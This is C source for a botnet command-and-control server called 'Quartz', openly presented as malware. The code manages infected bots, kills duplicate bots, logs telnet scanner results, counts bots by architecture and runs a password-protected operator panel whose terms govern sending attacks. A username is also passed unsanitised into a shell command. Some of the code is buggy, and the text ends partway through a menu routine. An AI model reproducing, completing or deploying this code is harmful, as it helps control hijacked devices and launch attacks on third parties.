/*Cia Developed By Gcezp
- This Version Has No Banner 
- Has A working API System
- Preset Methods and Arguments
- Small Bins
- Logs Ips, Client Connections, And Monitors the C2
- Ban And Unban Ips From The C2
-------------------------------------------
- This Whole Source Was Developed By Gcezp*/ 
#define MAXFDS 1000000
#include "main.h"
#include "resolve.h"
/////////////////////////////////
int adminstatus;

struct login_info {
	char username[200];
	char password[200];
	char type[200];
};
/////////////////////////////////////////
static struct login_info accounts[10];// Max people allowed to be logged in at once
/////////////////////////////////////////
struct clientdata_t {
        uint32_t ip;
        char connected;
        char build[7];
		char arch[30];
} clients[MAXFDS];
/////////////////////////
struct telnetdata_t {
    int connected;
    char ip[16];
    int adminstatus;
	int API;
	int Reg;
	char nickname[20];
} managements[MAXFDS];
/////////////////////////
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
struct telnetListenerArgs {
	int sock;
	uint32_t ip;
};
///////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
const char *get_host(uint32_t addr)
{
	struct in_addr in_addr_ip;
	in_addr_ip.s_addr = addr;
	return inet_ntoa(in_addr_ip);
}

void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;31m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				if(dup) {
					if(send(infd, "!* BOTKILL\n", 13, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                    close(infd);
                    continue;
				}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strstr(buf, "corona")||strstr(buf, "Corona")||strstr(buf, "CORONA")||strstr(buf, "BUILD")||strstr(buf, "Loading")||strstr(buf, "Device")) {close(datafd);}
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "REPORT ") == buf) {
						char *line = strstr(buf, "REPORT ") + 7;
						fprintf(telFD, "%s\n", line);
						fflush(telFD);
						TELFound++;
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
                    else if(strstr(buf, "arch ") != NULL){
                    //char *arch = strtok(buf, " ")+sizeof(arch)-3;
                        char *arch = strstr(buf, "arch ") + 5;
                        strcpy(clients->arch, arch);
                        strcpy(clients[datafd].arch, arch);
                        printf(" \x1b[38;2;255;0;66mIP:\x1b[1;35m %s \x1b[38;2;255;0;69m| \x1b[38;2;255;0;66mArch:\x1b[1;35m %s\x1b[0m\n", get_host(/*clients[datafd].ip*/client->ip), arch);
                        char k[60];
                        sprintf(k, "echo '%s' >> Logs/Bot_Connections.log", get_host(client->ip));
                    }
				}
				//printf("%s", buf);
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			    if (done) {
					// This Shows Disconnected Bots
			    //printf("\x1b[38;2;255;0;66mDisconnected IP:\x1b[1;35m %s\n", get_host(/*clients[datafd].ip*/client->ip));
				client->connected = 0;
				close(datafd);
				}
				}
			}
		}
	}
}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
void countArch(){
    int x;
    for(x = 0; x < MAXFDS; x++){
        if(strstr(clients[x].arch, "mips") && clients[x].connected == 1)
            MIPS++;
        else if(strstr(clients[x].arch, "mipsel") || strstr(clients[x].arch, "mpsl") && clients[x].connected == 1)
            MIPSEL++;
        else if(strstr(clients[x].arch, "armv4") && clients[x].connected == 1)
            ARM4++;
        else if(strstr(clients[x].arch, "armv5") && clients[x].connected == 1)
            ARM5++;
        else if(strstr(clients[x].arch, "armv6") && clients[x].connected == 1)
            ARM6++;
        else if(strstr(clients[x].arch, "armv7") && clients[x].connected == 1)
            ARM7++;
        else if(strstr(clients[x].arch, "x86") && clients[x].connected == 1)
            X86++;
        else if(strstr(clients[x].arch, "powerpc") && clients[x].connected == 1)
            PPC++;
        else if(strstr(clients[x].arch, "sh4") && clients[x].connected == 1)
            SUPERH++;
        else if(strstr(clients[x].arch, "m68k") && clients[x].connected == 1)
            M68K++;
        else if(strstr(clients[x].arch, "sparc") && clients[x].connected == 1)
            SPARC++;
        else if(strstr(clients[x].arch, "unknown") && clients[x].connected == 1)
            UNKNOWN++;
    }
}
void *TitleWriter(void *sock) 
{
	int datafd = (int)sock;
    char string[2048];
    while(1) 
    {
		memset(string, 0, 2048);
        //%c]0; %d = bot count
        // %d online kids %c
        sprintf(string, "%c]0; Quartz ~ Bots[%d] Spoofed Servers[0] Dedicated Servers[8] Users[%d] Power[Normal] Type[Client]  %c", '\033', BotsConnected(), OperatorsConnected, '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(3);
		}
}		        
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.sql", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *arguments, void *sock)
{ 
	struct telnetListenerArgs *args = arguments;
    char username[80];
    int datafd = (int)args->sock;
    const char *management_ip = get_host(args->ip);
    //printf("%s\n", management_ip);  
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* usernames;
	char* passwords;
	char botnet[2048];
	char botcount [2048];
	char statuscount [2048];
	char input [5000];

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.sql", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s %s", accounts[j].username, accounts[j].password, accounts[j].type);
		++j;
	}

    char login[25][1024];
    char string[2048];
    sprintf(string, "%c]0; Quartz Security Prompt %c", '\033', '\007');
    if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
    sprintf(login[1],  "\x1b[38;2;255;0;6mWelcome \x1b[38;2;255;0;66mTo \x1b[38;2;255;0;69mQuartz \x1b[38;2;255;0;129mSecurity \x1b[38;2;255;0;132mC\x1b[38;2;255;0;192m2\x1b[0m\r\n");
    sprintf(login[2],  "\x1b[38;2;255;0;195mPlease \x1b[38;2;255;0;195mEnter Your \x1b[38;2;255;0;192mLogin \x1b[38;2;255;0;255mCredentials\x1b[0m\r\n"); 
    sprintf(login[3],  "\x1b[38;2;255;0;69m\x1b[0m\r\n");

	int h;
	for(h =0;h<21;h++)
	if(send(datafd, login[h], strlen(login[h]), MSG_NOSIGNAL) == -1) goto end;
	char clearscreen [2048];
	memset(clearscreen, 0, 2048);
	sprintf(clearscreen, "\033[1A");
	char user [5000];	
	
    sprintf(user, "\x1b[38;2;255;0;6mUs\x1b[38;2;255;0;66mer\x1b[38;2;255;0;69mna\x1b[38;2;255;0;129mme\x1b[38;2;255;0;69m:\x1b[1;97m ");
	
	if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
	char* nickstring;
	sprintf(accounts[find_line].username, buf);
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    if(strcmp(nickstring, accounts[find_line].username) == 0){
	char password [5000];
    sprintf(password, "\x1b[38;2;255;0;192mPa\x1b[38;2;255;0;195mss\x1b[38;2;255;0;255mwo\x1b[38;2;255;0;195mrd\x1b[38;2;255;0;69m:\x1b[0;30m ", accounts[find_line].password);
	if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
	
    if(fdgets(buf, sizeof buf, datafd) < 1) goto end;

    trim(buf);
    if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
    memset(buf, 0, 2048);
	goto Banner;
    }
     failed:
    if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
    char *kkkkkkk = "\x1b[38;2;255;0;66mError, Incorrect Login \x1b[38;2;255;0;255mCredentials. Your IP Has Been Logged!\x1b[0m\r\n";
    if(send(datafd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1) goto end;
    FILE *logFile;
    logFile = fopen("Logs/failed_attempts.log", "a");
    fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
    printf("\x1b[1;31mFailed Login Attempt \x1b[1;36m(\x1b[1;31m%s\x1b[1;36m)\x1b[0m\n", management_ip);
    fclose(logFile);
    //broadcast(buf, datafd, usernamez, 0, MAXFDS, datafd);
    memset(buf, 0, 2048);
    sleep(5);
    goto end;
	Banner:

	pthread_create(&title, NULL, &TitleWriter, datafd);
	char ascii_banner_line1 [5000];
    char *hahalaughnow[60];
    char *userlog  [800];

    sprintf(managements[datafd].nickname, "%s", accounts[find_line].username);
    sprintf(hahalaughnow, "echo '%s Has Logged In | Ip: %s' >> Logs/client_connections.log", accounts[find_line].username, management_ip);
    system(hahalaughnow);
    if(!strcmp(accounts[find_line].type, "admin")){
        managements[datafd].adminstatus = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\x1b[1;97mUser \x1b[38;2;255;0;69m%s \x1b[1;97mHas Logged In \x1b[38;2;255;0;69m| \x1b[1;97mAccount Type\x1b[38;2;255;0;69m:\x1b[1;97m Admin\x1b[38;2;255;0;69m |\x1b[1;97m Admin Ips Are Not\x1b[38;2;255;0;69m Logged\x1b[0m\n", accounts[find_line].username);
	}
		if(!strcmp(accounts[find_line].type, "Reg")){
        managements[datafd].Reg = 1;
        broadcast(buf, datafd, accounts[find_line].username);
        printf("\x1b[1;97mUser \x1b[38;2;255;0;69m%s \x1b[1;97mHas Logged In \x1b[38;2;255;0;69m| \x1b[1;97mAccount Type\x1b[38;2;255;0;69m:\x1b[1;97m Regular\x1b[38;2;255;0;69m |\x1b[1;97m Users Ip\x1b[38;2;255;0;69m:\x1b[1;97m %s \x1b[0m\n", accounts[find_line].username, management_ip);
    }
	snprintf(managements[datafd].ip, sizeof(managements[datafd].ip), "%s", management_ip); // Saves The Logged In Users Ip
   	
	    char topusername[5000];
        char blankline[5000];
        char ascii1[5000];
        char space1[5000];
        char space2[5000];
        char ascii2[5000];
        char ascii3[5000];
        char ascii4[5000];
        char ascii5[5000];
        char prompt[5000];
        char prompt2[5000];
        sprintf(topusername, "\x1b[38;2;255;0;66m𝗟𝗼𝗴𝗴𝗲𝗱 𝗔𝘀 < %s > ", accounts[find_line].username);
        sprintf(blankline, "\x1b[38;2;255;0;192m to \x1b[38;2;255;0;195mQuartz \x1b[38;2;255;0;255mC2 \x1b[38;2;255;0;69mSession.\r\n");
        sprintf(space1, "\x1b");
        sprintf(space2, "\x1b");
        sprintf(ascii1, "\x1b[38;2;255;0;66m                   .▄▄▄  \x1b[38;2;255;0;129m▄• ▄▌\x1b[38;2;255;0;132m ▄▄▄· \x1b[38;2;255;0;192m▄▄▄  \x1b[38;2;255;0;195m▄▄▄▄▄\x1b[38;2;255;0;255m·▄▄▄▄•         \r\n");
        sprintf(ascii2, "\x1b[38;2;255;0;66m                   ▐▀•▀█ \x1b[38;2;255;0;129m█▪██▌\x1b[38;2;255;0;132m▐█ ▀█ \x1b[38;2;255;0;192m▀▄ █·\x1b[38;2;255;0;195m•██  \x1b[38;2;255;0;255m▪▀·.█▌         \r\n");
        sprintf(ascii3, "\x1b[38;2;255;0;66m                   █▌·.█▌\x1b[38;2;255;0;129m█▌▐█▌\x1b[38;2;255;0;132m▄█▀▀█ \x1b[38;2;255;0;192m▐▀▀▄ \x1b[38;2;255;0;195m ▐█.\x1b[38;2;255;0;255m▪▄█▀▀▀•         \r\n");
        sprintf(ascii4, "\x1b[38;2;255;0;66m                   ▐█▪▄█·\x1b[38;2;255;0;129m▐█▄█▌\x1b[38;2;255;0;132m▐█ ▪▐▌\x1b[38;2;255;0;192m▐█•█▌\x1b[38;2;255;0;195m ▐█▌\x1b[38;2;255;0;255m·█▌▪▄█▀          \r\n");
        sprintf(ascii5, "\x1b[38;2;255;0;66m                   ·▀▀█. \x1b[38;2;255;0;129m ▀▀▀ \x1b[38;2;255;0;132m ▀  ▀ \x1b[38;2;255;0;192m.▀  ▀\x1b[38;2;255;0;195m ▀▀▀ \x1b[38;2;255;0;255m·▀▀▀ •          \r\n");
        sprintf(prompt, "\x1b[38;2;255;0;66m╔═[\x1b[38;2;255;0;69m%s\x1b[38;2;255;0;132m@\x1b[38;2;255;0;129mQuartz]\x1b[38;2;255;0;192m=$\r\n", accounts[find_line].username);
        sprintf(prompt2, "\x1b[38;2;255;0;66m╚══\x1b[38;2;255;0;69m⮞ ");

        if(send(datafd, topusername, strlen(topusername), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, blankline, strlen(blankline), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, space1, strlen(space1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, space2, strlen(space2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii1, strlen(ascii1), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii2, strlen(ascii2), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii3, strlen(ascii3), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii4, strlen(ascii4), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, ascii5, strlen(ascii5), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, prompt, strlen(prompt), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, prompt2, strlen(prompt2), MSG_NOSIGNAL) == -1) goto end;

        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0)
		{  
		if(strstr(buf, "CLEAR") || strstr(buf, "clear") || strstr(buf, "Clear") || strstr(buf, "cls") || strstr(buf, "CLS") || strstr(buf, "Cls")) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
                if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, space1, strlen(space1), MSG_NOSIGNAL) == -1) goto end;   
                if(send(datafd, space2, strlen(space2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii1, strlen(ascii1), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii2, strlen(ascii2), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii3, strlen(ascii3), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii4, strlen(ascii4), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, ascii5, strlen(ascii5), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, prompt, strlen(prompt), MSG_NOSIGNAL) == -1) goto end;
                if(send(datafd, prompt2, strlen(prompt2), MSG_NOSIGNAL) == -1) goto end;

				continue;
			}
            else if(strstr(buf, "Help") || strstr(buf, "help") || strstr(buf, "HELP") || strstr(buf, "?")) 
			{
				sprintf(botnet,  "\x1b[38;2;255;0;69mEXTRA  \x1b[38;2;255;0;66mShows You The Extra Commands  \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mADMIN \x1b[38;2;255;0;66mShows You The Admin Commands   \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mBASIC \x1b[38;2;255;0;66mShows You Basic Methods        \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);			
                sprintf(botnet, "\x1b[38;2;255;0;69mADVANCED \x1b[38;2;255;0;66mShows you Advanced Methods   \x1b[0m\r\n");
                if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
 		}
		else if(strstr(buf, "EXTRA") || strstr(buf, "Extra") || strstr(buf, "extra")) 
			{
				sprintf(botnet,  "\x1b[38;2;255;0;69mTOS     \x1b[38;2;255;0;66mShows The Terms Of Service     \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mBOTS    \x1b[38;2;255;0;66mAll Connected Devices          \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mTOOLS   \x1b[38;2;255;0;66mAll The Tools                  \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mLOGOUT  \x1b[38;2;255;0;66mLogs You Out Of The C2         \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;69mPROFILE \x1b[38;2;255;0;66mShows Your Account Info        \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
 		}
      else if(strstr(buf, "Profile") || strstr(buf, "profile") || strstr(buf, "PROFILE")) 
			{	
           sprintf(botnet,  "\x1b[38;2;255;0;69mUsername\x1b[38;2;255;0;66m: %s      \x1b[0m\r\n", accounts[find_line].username);
		   if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
		   sprintf(botnet,  "\x1b[38;2;255;0;69mPassword\x1b[38;2;255;0;66m: %s      \x1b[0m\r\n", accounts[find_line].password);
		   if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
		   sprintf(botnet,  "\x1b[38;2;255;0;69mIp\x1b[38;2;255;0;66m: %s            \x1b[0m\r\n", management_ip);
		   if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
		   sprintf(botnet,  "\x1b[38;2;255;0;69mAccount Type\x1b[38;2;255;0;66m: %s  \x1b[0m\r\n", accounts[find_line].type);
           if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
 		}		   
			else if(strstr(buf, "Bots") || strstr(buf, "BOTS") || strstr(buf, "bots")) 
			{
				countArch();
				char botcount [2048];
				char bcount[1024];
				memset(botcount, 0, 2048);
                if(MIPS != 0){
                    sprintf(bcount, "\x1b[38;2;255;0;69mMips:\x1b[1;97m%d\r\n\x1b[0m", MIPS);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(MIPSEL != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mMipsel:\x1b[1;97m%d\r\n\x1b[0m", MIPSEL);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM4 != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mArm4:\x1b[1;97m%d\r\n\x1b[0m", ARM4);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM5 != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mArm5:\x1b[1;97m%d\r\n\x1b[0m", ARM5);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM6 != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mArm6:\x1b[1;97m%d\r\n\x1b[0m", ARM6);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(ARM7 != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mArm7:\x1b[1;97m%d\r\n\x1b[0m", ARM7);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(X86 != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mx86:\x1b[1;97m%d\r\n\x1b[0m", X86);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(PPC != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mPpc:\x1b[1;97m%d\r\n\x1b[0m", PPC);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(M68K != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mM68k:\x1b[38;2;255;0;69m%d\r\n\x1b[0m", M68K);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(SPARC != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mSparc:\x1b[1;97m%d\r\n\x1b[0m", SPARC);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                if(UNKNOWN != 0){
				sprintf(bcount, "\x1b[38;2;255;0;69mUnknown Arch:\x1b[1;97m%d\r\n\x1b[0m", UNKNOWN);
                    if(send(datafd, bcount, strlen(bcount), MSG_NOSIGNAL) == -1) return;
                }
                MIPS = 0;
                MIPSEL = 0;
                ARM4 = 0;
                ARM5 = 0;
                ARM6 = 0;
                ARM7 = 0;
                X86 = 0;
                PPC = 0;
                M68K = 0;
                SPARC = 0;
				SUPERH = 0;
                UNKNOWN = 0;
				sprintf(botcount,    "\x1b[38;2;255;0;69mBots Connected: \x1b[1;97m%d\r\n", BotsConnected(), OperatorsConnected);
				if(send(datafd, botcount, strlen(botcount), MSG_NOSIGNAL) == -1) return;
			}
				else if(strstr(buf, "tos") || strstr(buf, "Tos") || strstr(buf, "TOS") || strstr(buf, "Rules")) 
					{          
                sprintf(botnet,  "\x1b[38;2;255;0;66mHello, \x1b[38;2;255;0;69m%s \x1b[0m\r\n", accounts[find_line].username);
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;66mOnce You Send An Attack You Agree To These TOS \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;66mHitting Gov Sites Is Strictly \x1b[38;2;255;0;69mProhibited \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;66mSpamming Results In A \x1b[38;2;255;0;69mPermanent Ban \x1b[0m\r\n");
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;66mTrying To Hit The Server or Crash The c2 Results In a Permanent Ban \x1b[0m\r\n");                                         
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;66mYou Agree To Us \x1b[38;2;255;0;69mLogging Your Ip and Actions While Connected To The c2 \x1b[0m\r\n");                
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
				sprintf(botnet,  "\x1b[38;2;255;0;66mI %s \x1b[38;2;255;0;69mAgree\x1b[38;2;255;0;66m To The TOS\x1b[0m\r\n", accounts[find_line].username); 
				if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
			}
					
	  else if(strstr(buf, "BASIC") || strstr(buf, "Basic") || strstr(buf, "basic")) 
		{ 		  
            char clearscreen [2048];
			memset(clearscreen, 0, 2048);
			sprintf(clearscreen, "\033[2J\033[1;1H");
            if(send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
			sprintf(botnet,"\x1b[38;2;255;0;66m                   .▄▄▄  \x1b[38;2;255;0;129m▄• ▄▌\x1b[38;2;255;0;132m ▄▄▄· \x1b[38;2;255;0;192m▄▄▄  \x1b[38;2;255;0;195m▄▄▄▄▄\x1b[38;2;255;0;255m·▄▄▄▄•       \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);	
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ▐▀•▀█ \x1b[38;2;255;0;129m█▪██▌\x1b[38;2;255;0;132m▐█ ▀█ \x1b[38;2;255;0;192m▀▄ █·\x1b[38;2;255;0;195m•██  \x1b[38;2;255;0;255m▪▀·.█▌         \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   █▌·.█▌\x1b[38;2;255;0;129m█▌▐█▌\x1b[38;2;255;0;132m▄█▀▀█ \x1b[38;2;255;0;192m▐▀▀▄ \x1b[38;2;255;0;195m ▐█.\x1b[38;2;255;0;255m▪▄█▀▀▀•        \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ▐█▪▄█·\x1b[38;2;255;0;129m▐█▄█▌\x1b[38;2;255;0;132m▐█ ▪▐▌\x1b[38;2;255;0;192m▐█•█▌\x1b[38;2;255;0;195m ▐█▌\x1b[38;2;255;0;255m·█▌▪▄█▀        \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet,"\x1b[38;2;255;0;66m                   ·▀▀█. \x1b[38;2;255;0;129m ▀▀▀ \x1b[38;2;255;0;132m ▀  ▀ \x1b[38;2;255;0;192m.▀  ▀\x1b[38;2;255;0;195m ▀▀▀ \x1b[38;2;255;0;255m·▀▀▀ •             \r\n");
            if(send(datafd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
